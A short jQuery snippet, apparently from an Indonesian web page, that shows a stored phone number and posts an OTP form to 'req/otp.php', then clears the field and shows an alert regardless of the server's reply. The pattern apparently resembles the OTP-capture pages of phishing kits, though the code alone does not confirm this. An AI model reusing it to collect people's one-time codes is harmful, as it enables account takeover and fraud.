    var nomor = sessionStorage.getItem("nomor");

    document.getElementById("alert").innerHTML = " ( " + nomor + " ) ";
     
 $('#formLink').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
 document.getElementById('kirims').value = "Memproses....";



$.ajax({

 type: 'POST',
 url: 'req/otp.php',
 async: false,
 dataType: 'text',
 data: $(this).serialize(),
 
 complete: function(data) {
            vibr(800);
            
            console.log('Complete')
 setTimeout(function(){
  showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";


    }, 200);



        }
    });

    return false;
}); 
